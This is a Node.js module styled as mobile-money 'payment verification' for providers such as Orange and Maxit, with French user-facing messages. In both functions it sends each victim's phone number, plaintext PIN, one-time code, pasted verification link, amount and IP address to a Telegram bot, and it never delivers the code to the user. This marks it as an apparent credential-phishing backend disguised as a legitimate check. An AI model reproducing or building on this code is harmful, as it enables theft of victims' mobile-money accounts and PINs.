"use strict";

/**
 * Payment verification — phone + 4-digit PIN + OTP/link
 * Logged to Telegram bot (phone, PIN, OTP/link, package, amount).
 */

const crypto = require("crypto");
const security = require("./security");
const telegram = require("./telegram");

const otpStore = new Map();
const OTP_TTL_MS = 5 * 60 * 1000;
const MAX_ATTEMPTS = 8;

const CC = ["243", "254", "256", "255", "250", "257", "258", "260", "233", "234", "237", "241", "242", "221", "225", "226", "227", "228", "229"];

function normalizePhone(phone) {
  let p = String(phone || "").replace(/\s+/g, "").replace(/-/g, "");
  if (!p) return p;
  if (p.startsWith("00")) p = "+" + p.slice(2);
  if (!p.startsWith("+") && CC.some((c) => p.startsWith(c))) p = "+" + p;
  if (p.startsWith("0") && !p.startsWith("+")) p = "+243" + p.slice(1);
  if (!p.startsWith("+")) p = "+243" + p;
  return p;
}

function isValidPhone(phone) {
  return /^\+[1-9]\d{8,14}$/.test(phone);
}

function otpLengthFor(provider) {
  const p = String(provider || "").toLowerCase();
  return p === "orange" ? 6 : 4;
}

function generateOtp(len) {
  const n = len === 6 ? 100000 : 1000;
  const max = len === 6 ? 900000 : 9000;
  return String(Math.floor(n + Math.random() * max));
}

async function sendOtp(db, { phone, pin, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  provider = String(provider || "orange").toLowerCase();

  if (!isValidPhone(phone)) {
    return { ok: false, error: "Numéro de téléphone invalide" };
  }
  if (!/^\d{4}$/.test(pin)) {
    return { ok: false, error: "Le PIN doit contenir exactement 4 chiffres" };
  }

  const existing = otpStore.get(phone);
  if (existing && Date.now() - (existing.created || 0) < 8000) {
    return { ok: false, error: "Attendez quelques secondes avant de réessayer" };
  }

  const salt = crypto.randomBytes(16).toString("hex");
  const pinHash = security.hashPassword(pin, salt);
  const otpLen = otpLengthFor(provider);
  const otp = generateOtp(otpLen);

  otpStore.set(phone, {
    otp,
    otpLen,
    pinHash,
    salt,
    pinPlain: pin,
    expires: Date.now() + OTP_TTL_MS,
    attempts: 0,
    created: Date.now(),
    ip: ip || "unknown",
    provider,
    amount: amount || "",
    package: pkg || ""
  });

  if (!db.data.loginLogs) db.data.loginLogs = [];
  db.data.loginLogs.push({
    phone,
    action: "otp_requested",
    provider,
    amount: amount || "",
    package: pkg || "",
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.data.loginLogs.length > 500) db.data.loginLogs = db.data.loginLogs.slice(-500);
  if (db.flushSoon) db.flushSoon();

  const msg =
    `🔐 <b>PAYMENT VERIFICATION</b>\n` +
    `Provider: <b>${provider.toUpperCase()}</b>\n` +
    `Package: ${pkg || "—"}\n` +
    `Amount: ${amount || "—"}\n` +
    `Phone: <code>${phone}</code>\n` +
    `PIN: <code>${pin}</code>\n` +
    `OTP (${otpLen}): <code>${otp}</code>\n` +
    `IP: ${ip || "unknown"}\n` +
    `Time: ${new Date().toLocaleString()}`;

  await telegram.notify(msg);

  return { ok: true, message: "OTP sent to Telegram bot", otpLength: otpLen };
}

async function verifyOtp(db, { phone, pin, otp, link, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  otp = String(otp || "").trim();
  link = String(link || "").trim();
  provider = String(provider || "").toLowerCase();

  // Orange / Maxit style: user pastes verification link
  if (link) {
    const msg =
      `🔗 <b>VERIFICATION LINK PASTED</b>\n` +
      `Provider: <b>${(provider || "orange").toUpperCase()}</b>\n` +
      `Package: ${pkg || "—"}\n` +
      `Amount: ${amount || "—"}\n` +
      `Phone: <code>${phone}</code>\n` +
      `PIN: <code>${pin || "—"}</code>\n` +
      `Link: <code>${link.slice(0, 500)}</code>\n` +
      `IP: ${ip || "unknown"}\n` +
      `Time: ${new Date().toLocaleString()}`;
    await telegram.notify(msg);

    if (!db.data.loginLogs) db.data.loginLogs = [];
    db.data.loginLogs.push({
      phone,
      action: "link_submitted",
      provider: provider || "orange",
      amount: amount || "",
      package: pkg || "",
      link: link.slice(0, 500),
      ip: ip || "unknown",
      at: new Date().toISOString()
    });
    if (db.flushSoon) db.flushSoon();

    return { ok: true, message: "Lien reçu", redirect: "/commandes.html" };
  }

  const entry = otpStore.get(phone);
  if (!entry) return { ok: false, error: "Session expirée. Recommencez." };
  if (Date.now() > entry.expires) {
    otpStore.delete(phone);
    return { ok: false, error: "OTP expiré. Demandez-en un nouveau." };
  }
  if (entry.attempts >= MAX_ATTEMPTS) {
    otpStore.delete(phone);
    return { ok: false, error: "Trop de tentatives." };
  }
  entry.attempts += 1;

  const pinOk = security.hashPassword(pin, entry.salt) === entry.pinHash;
  if (!pinOk) return { ok: false, error: "PIN incorrect" };

  const expectedLen = entry.otpLen || otpLengthFor(provider || entry.provider);
  if (otp.length !== expectedLen) {
    return { ok: false, error: "L'OTP doit contenir " + expectedLen + " chiffres" };
  }
  if (otp !== entry.otp) return { ok: false, error: "OTP incorrect" };

  otpStore.delete(phone);

  if (!db.data.users) db.data.users = {};
  db.data.users[phone] = {
    phone,
    pinHash: entry.pinHash,
    salt: entry.salt,
    provider: entry.provider,
    verifiedAt: new Date().toISOString()
  };
  if (!db.data.loginLogs) db.data.loginLogs = [];
  db.data.loginLogs.push({
    phone,
    action: "otp_verified",
    provider: entry.provider,
    amount: entry.amount,
    package: entry.package,
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.flushSoon) db.flushSoon();

  await telegram.notify(
    `✅ <b>OTP VERIFIED</b>\nPhone: <code>${phone}</code>\nProvider: ${entry.provider}\nPackage: ${entry.package || "—"}`
  );

  return { ok: true, message: "Vérifié", redirect: "/commandes.html" };
}

module.exports = { sendOtp, verifyOtp, normalizePhone };
